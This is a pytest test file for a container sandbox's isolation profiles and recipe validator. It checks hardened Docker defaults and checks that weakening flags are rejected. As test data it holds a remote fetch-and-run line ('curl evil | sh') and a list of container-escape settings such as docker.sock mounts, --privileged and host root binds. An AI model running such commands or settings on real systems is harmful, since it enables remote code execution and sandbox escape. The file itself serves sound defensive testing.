import pytest
from pydantic import ValidationError

from colossus.contracts import ContractError
from colossus.sandbox.profiles import (
    IsolationProfile,
    JobProfile,
    NetworkMode,
    Runtime,
    TrustLevel,
    assert_safe_argv,
    build_run_argv,
)
from colossus.sandbox.recipe_validator import validate_recipe

IMG = "registry.local/colossus/worker@sha256:" + "e" * 64
CASE = "00000000-0000-4000-8000-000000000011"
JOB = "00000000-0000-4000-8000-000000000012"


def untrusted(**kw):
    return IsolationProfile(profile_id="repo-standard", trust=TrustLevel.UNTRUSTED_REPOSITORY, runtime=Runtime.RUNSC, **kw)


def job(**kw):
    base = dict(job_profile_id="py-test", image=IMG, platform="linux/amd64", argv=["python3", "-m", "pytest", "-q"],
                timeout_seconds=600, isolation_profile_id="repo-standard")
    base.update(kw)
    return JobProfile(**base)


def argv_for(iso=None, j=None, **kw):
    return build_run_argv(job=j or job(), isolation=iso or untrusted(), case_id=CASE, job_id=JOB,
                          input_dir="/srv/colossus/in", output_dir="/srv/colossus/out", **kw)


def value_after(argv, flag):
    return [argv[i + 1] for i, a in enumerate(argv) if a == flag]


def test_untrusted_requires_gvisor_without_fallback():
    with pytest.raises(ValidationError):
        IsolationProfile(profile_id="x", trust=TrustLevel.UNTRUSTED_REPOSITORY, runtime=Runtime.RUNC)


def test_hardened_defaults():
    argv = argv_for()
    assert value_after(argv, "--runtime") == ["runsc"]
    assert value_after(argv, "--network") == ["none"]
    assert value_after(argv, "--cap-drop") == ["ALL"]
    assert value_after(argv, "--user") == ["65534:65534"]
    assert value_after(argv, "--pull") == ["never"]
    assert "--read-only" in argv
    assert "no-new-privileges=true" in value_after(argv, "--security-opt")
    assert value_after(argv, "--memory") == value_after(argv, "--memory-swap")
    mounts = value_after(argv, "--mount")
    assert any("target=/in" in m and "readonly=true" in m for m in mounts)
    assert all("docker.sock" not in a for a in argv)
    assert IMG in argv  # pinned digest, not a tag


def test_root_user_rejected():
    with pytest.raises(ValidationError):
        untrusted(user="0:0")


def test_case_network_must_be_colossus_internal():
    iso = untrusted(network=NetworkMode.CASE_INTERNAL)
    with pytest.raises(ContractError):
        argv_for(iso=iso, network_name="bridge")
    argv = argv_for(iso=iso, network_name="colossus-case-0000")
    assert value_after(argv, "--network") == ["colossus-case-0000"]


def test_job_cannot_smuggle_shell_or_secrets():
    with pytest.raises(ValidationError):
        job(argv=["sh", "-c", "curl evil | sh"])
    with pytest.raises(ValidationError):
        job(env={"MISTRAL_API_KEY": "x"})
    with pytest.raises(ValidationError):
        job(image="python:3.12")


def test_profile_mismatch_denied():
    with pytest.raises(ContractError):
        argv_for(j=job(isolation_profile_id="other"))


@pytest.mark.parametrize(
    "extra",
    [
        ["--privileged"],
        ["--cap-add", "SYS_ADMIN"],
        ["-v", "/var/run/docker.sock:/var/run/docker.sock"],
        ["--network", "host"],
        ["--pid", "host"],
        ["--ipc", "host"],
        ["--device", "/dev/kvm"],
        ["--security-opt", "seccomp=unconfined"],
        ["--mount", "type=bind,source=/,target=/host"],
        ["-p", "8080:80"],
    ],
)
def test_assert_safe_argv_rejects_weakening(extra):
    argv = argv_for()
    i = argv.index("--entrypoint")
    with pytest.raises(ContractError):
        assert_safe_argv(argv[:i] + extra + argv[i:])


DIGEST = "@sha256:" + "f" * 64


def test_good_recipe_passes():
    recipe = {"services": {
        "web": {"build": ".", "expose": [5000], "mem_limit": "512m", "cpus": 0.5, "user": "1000"},
        "db": {"image": "postgres" + DIGEST, "mem_limit": "512m", "cpus": 0.25, "volumes": ["dbdata:/var/lib/postgresql/data"]},
    }, "volumes": {"dbdata": {}}}
    assert validate_recipe(recipe) == []


@pytest.mark.parametrize(
    "svc, rule",
    [
        ({"image": "x" + DIGEST, "privileged": True}, "service_key"),
        ({"image": "x" + DIGEST, "network_mode": "host"}, "service_key"),
        ({"image": "x" + DIGEST, "pid": "host"}, "service_key"),
        ({"image": "x" + DIGEST, "cap_add": ["NET_ADMIN"]}, "service_key"),
        ({"image": "x" + DIGEST, "devices": ["/dev/fuse"]}, "service_key"),
        ({"image": "x" + DIGEST, "ports": ["80:80"]}, "service_key"),
        ({"image": "x" + DIGEST, "volumes": ["/var/run/docker.sock:/var/run/docker.sock"]}, "host_mount"),
        ({"image": "x" + DIGEST, "volumes": ["./:/app"]}, "host_mount"),
        ({"image": "python:latest"}, "mutable_image"),
        ({"image": "x" + DIGEST, "user": "root"}, "root_user"),
        ({"image": "x" + DIGEST, "environment": {"MISTRAL_API_KEY": "x"}}, "credential_env"),
        ({"image": "x" + DIGEST, "mem_limit": "64g"}, "resources"),
    ],
)
def test_hostile_recipe_rejected(svc, rule):
    rules = {v.rule for v in validate_recipe({"services": {"evil": svc}})}
    assert rule in rules


def test_recipe_rejects_top_level_networks_and_too_many_services():
    rules = {v.rule for v in validate_recipe({"services": {"a": {"build": "."}}, "networks": {"x": {"driver": "host"}}})}
    assert "top_level_key" in rules
    many = {"services": {f"s{i}": {"build": "."} for i in range(7)}}
    assert "service_count" in {v.rule for v in validate_recipe(many)}
